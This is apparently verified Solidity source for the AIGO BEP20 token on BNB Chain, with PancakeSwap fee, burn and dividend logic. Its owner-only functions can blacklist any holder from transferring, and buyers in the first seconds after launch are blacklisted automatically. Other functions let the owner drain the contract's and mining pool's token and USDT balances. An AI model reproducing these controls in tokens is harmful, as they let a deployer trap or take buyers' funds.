/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
interface IBEP20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IBEP20Metadata is IBEP20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);
    
    function decimals() external view returns (uint8);

}
library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address ) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Address {
   
    function isContract(address account) internal view returns (bool) {
        
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
}

contract BEP20 is Context, IBEP20, IBEP20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract usdtReceiver {
    address private usdt = 0x55d398326f99059fF775485246999027B3197955;
    constructor() {
        IBEP20(usdt).approve(msg.sender,~uint256(0));
    }
}

contract MiningPool is Ownable {
    
    bool locked = true;
    using SafeMath for uint256;
    address private usdt = 0x55d398326f99059fF775485246999027B3197955;

    function claimLeftToken(address Token,uint256 amount) external onlyOwner {
        require(!locked,"token is locked");
        uint256 left = IBEP20(Token).balanceOf(address(this));
        require(left >= amount, "unsufficient balance");
        IBEP20(Token).transfer(owner(), amount);
    }

    function setlocked(bool _islock) external onlyOwner {
        locked = _islock;
    }
   
}

contract AIGO is Ownable, BEP20 {
    using Address for address;
    using SafeMath for uint256;

    address private pancakeRouterAddr = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public usdt = 0x55d398326f99059fF775485246999027B3197955;
    address public fundWallet = 0x923EdAC12e36cDb7aFE5F39b4b000a146575e267;

    uint256 public lpFeeRate = 4;
    uint256 public fundFeeRate = 2;
    uint256 public destroyFeeRate = 2;

    mapping(address => bool) public _isdividend;
    address[] public dividendlist;

    bool isLaunch;
    uint256 launchTime;
    address public pair;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;
    mapping (address => bool) public exemptFee;
    mapping(address => bool) public isblacked;
    usdtReceiver public _usdtReceiver;
    IPancakeRouter02 private _router;

    MiningPool public miningPool;

    constructor() BEP20("AIGO", "AIGO") {
        exemptFee[_msgSender()] = true;
        exemptFee[fundWallet] = true;
        exemptFee[address(this)] = true;
        _usdtReceiver = new usdtReceiver();
        _router = IPancakeRouter02(pancakeRouterAddr);
        pair = IPancakeFactory(_router.factory()).createPair(address(usdt),address(this));

        miningPool = new MiningPool();
        _mint(owner(), 20000000 * (10**18));
        _mint(address(miningPool), 20000000 * (10**18));
    }

    function getdividend() view external returns(address[] memory){
        return dividendlist;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!isblacked[sender], "black address");

        if(amount == 0) {
            super._transfer(sender, recipient, 0);
            return;
        }  
        uint256 burnfee;
        uint256 otherfee;

        if(!exemptFee[sender] && !exemptFee[recipient]) {
            burnfee = amount.mul(destroyFeeRate).div(100);
            otherfee = amount.mul(lpFeeRate+fundFeeRate).div(100);
            require(isLaunch, "BEP20: Transfer not open");
            if (sender == pair && block.timestamp < launchTime + 7) {
                isblacked[recipient] = true;
            }
            _burn(sender, burnfee);
            super._transfer(sender, address(this), otherfee);
            amount = amount.sub(burnfee+otherfee);
        }

        super._transfer(sender, recipient, amount);
    }

    function DistributeUSDT() external onlyOwner {

        uint256 amount = balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdt;

        _approve(address(this), address(_router), amount);
        // make the swap
        _router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0, // accept any amount of USDT
            path,
            address(_usdtReceiver),
            block.timestamp
        );

        uint256 usdtBalance = IBEP20(usdt).balanceOf(address(_usdtReceiver));
        uint256 fundfee = usdtBalance.mul(fundFeeRate).div(lpFeeRate+fundFeeRate);
        uint256 lpfee = usdtBalance.sub(fundfee);

        IBEP20(usdt).transferFrom(address(_usdtReceiver),fundWallet,fundfee);
        IBEP20(usdt).transferFrom(address(_usdtReceiver),address(this),lpfee);
        uint distributetotal;

        for(uint256 i = 0; i < dividendlist.length; i++) {
            if(_isdividend[dividendlist[i]]){
                distributetotal++;
            }
        }
        uint256 reward = lpfee.div(distributetotal);
        for(uint256 i = 0; i < dividendlist.length; i++) {
            if(_isdividend[dividendlist[i]]){
                IBEP20(usdt).transfer(dividendlist[i],reward);
            }
        }
    }

    function launch() public onlyOwner {
        require(!isLaunch, "BEP20: Allready launch");
        isLaunch = true;
        launchTime = block.timestamp;
    }

    function setFundWallet(address newaddress) external onlyOwner { 
        fundWallet = newaddress;
    }

    function setblackAddress(address account, bool value) public onlyOwner{
        isblacked[account] = value;
    }

    function add_dividend(address account) external onlyOwner { 
        require(!_isdividend[account],"have exist true!");
        for(uint256 i = 0; i < dividendlist.length; i++) {
            require(dividendlist[i]!=account,"Once added!");
        }
        dividendlist.push(account);
        _isdividend[account] = true;
    }

    function add_dividendfirst(address[]memory account) external onlyOwner { 
        for(uint256 i = 0; i < account.length; i++) {
            require(!_isdividend[account[i]],"have exist!");
            dividendlist.push(account[i]);
            _isdividend[account[i]] = true;
        }
    }

    function remove_dividend(address account) external onlyOwner { 
        require(_isdividend[account],"have exist false!");
        _isdividend[account] = false;
    }
    
    function setExemptFee(address[] memory account, bool iswhite) external onlyOwner {
        require(account.length > 0, "no account");
        for(uint256 i = 0; i < account.length; i++) {
            exemptFee[account[i]] = iswhite;
        }
    }

    function claimLeftTokenOfminingPool(address Token,uint256 value) external onlyOwner { 
        miningPool.claimLeftToken(Token,value);
    }
    
    function setlockminingPool(bool _islock) external onlyOwner { 
        miningPool.setlocked(_islock);
    }

    function claimLeftToken(address token) external onlyOwner {
        uint256 left = IBEP20(token).balanceOf(address(this));
        IBEP20(token).transfer(_msgSender(), left);
    }

    function claimLeftUSDTofusdtReceiver(address Token) external onlyOwner {
        uint256 left = IBEP20(Token).balanceOf(address(_usdtReceiver));
        IBEP20(Token).transferFrom(address(_usdtReceiver), owner(), left);
    }
    
}